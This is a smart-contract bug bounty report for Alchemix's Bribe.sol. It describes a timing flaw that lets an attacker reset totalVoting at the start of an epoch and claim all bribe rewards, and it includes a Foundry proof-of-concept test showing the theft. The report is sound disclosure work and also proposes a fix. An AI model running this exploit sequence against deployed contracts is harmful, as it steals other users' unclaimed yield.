# 30860 - \[SC - Critical] Wrong timestamp for totalVoting

Submitted on May 7th 2024 at 04:17:29 UTC by @cryptoticky for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30860

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Theft of unclaimed yield
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

The attacker can change `totalVoting` at the first second of a new epoch and steal all reward for an epoch.

## Vulnerability Details

```
    /// @inheritdoc IBribe
    function earned(address token, uint256 tokenId) public view returns (uint256) {
        ...
        Checkpoint memory cp = checkpoints[tokenId][_endIndex];
        uint256 _lastEpochStart = _bribeStart(cp.timestamp);
        uint256 _lastEpochEnd = _lastEpochStart + DURATION;
        uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes;

        // Prevent divide by zero
        if (_priorSupply == 0) {
            _priorSupply = 1;
        }

        if (block.timestamp > _lastEpochEnd) {
            reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
        }

        return reward;
    }
```

If an attacker call `Voter.distribute` at `_lastEpochStart + DURATION`, then `Bribe.resetVoting` function is triggered and `totalVoting` is updated to `0`. And then if the attacker call `Voter.vote` function the same params (or tokenId with less votingPower), then `Bribe._writeVotingCheckpoint` is triggered and `votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes` is updated with the new votes. And the attacker claim the reward at the next block before other users claim. The smaller the new vote amount, the more rewards the attacker can steal.

## Impact Details

The attacker can steal reward and other users can't claim the reward.

## Recommandation

Bribe.sol: 268 line

```
uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes;
```

to

```
uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd) - 1].votes;
```

## Proof of Concept

```
// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract BribePoC is BaseTest {
    uint256 constant DURATION = 2 weeks;
    uint256 constant SECONDS_PER_BLOCK = 12;
    uint256 public epochTime;
    uint256 public epochBlock;

    function setUp() public {
        setupContracts(block.timestamp);
        epochTime = minter.activePeriod();
        epochBlock = block.number;
    }

    function goNextEpoch() private {
        epochTime = epochTime + DURATION;
        epochBlock = epochBlock + DURATION / 12;
        hevm.warp(epochTime);
        hevm.roll(epochBlock);
    }

    function testBugPriorBalanceIndex() public {

        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10000;



        // go epoch 1
        goNextEpoch();

        // at start time of epoch 1
        uint256 targetTokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 userTokenId = createVeAlcx(beef, TOKEN_1 * 1000, MAXTIME, false);

        voter.distribute();

        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        hevm.prank(admin);
        voter.vote(targetTokenId, pools, weights, 0);

        hevm.prank(beef);
        voter.vote(userTokenId, pools, weights, 0);

        // totalVoting = (1 + 1000) * votingPowerPerTokenAtMaxtime = 1001 * votingPowerPerTokenAtMaxtime
        // reward expected for targetTokenId = 100K * 1 / 1001 = 100/1001 K

        // go epoch 2
        goNextEpoch();

        // at start time of epoch 2
        voter.distribute();

        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        // create a new token with same amount
        uint256 supportTokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

        hevm.prank(admin);
        // at start time of epoch 2
        voter.vote(supportTokenId, pools, weights, 0);
        // after this tx, the totalVoting = 1 * votingPowerPerTokenAtMaxtime
        // earnedAmount = 100K * 1 / 1 = 100 K
        // it means that the smaller the voting power of the supportTokenId, the more rewards it can steal.
        // but this is not calculated because of block.timestamp == _lastEpochEndthis in Bribe.sol
        //     if (block.timestamp > _lastEpochEnd) {
        //          reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
        //     }
        // so the attacker waits for the next block
        hevm.warp(block.timestamp + SECONDS_PER_BLOCK);
        hevm.roll(block.number + 1);

        // in the second block of epoch 2
        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        uint256 beforeBalOfAdmin = IERC20(bal).balanceOf(admin);

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, targetTokenId);

        uint256 deltaBalOfAdmin = IERC20(bal).balanceOf(admin) - beforeBalOfAdmin;

        // The success means the attacker stole all reward of epoch 1
        // In the Bribe contract, rewards for other users who have not claimed for a long time, including rewards from new epoch, may remain.
        // The attacker can steal all these funds.
        assertEq(TOKEN_100K, deltaBalOfAdmin, "The attack is failed");
    }
}
```
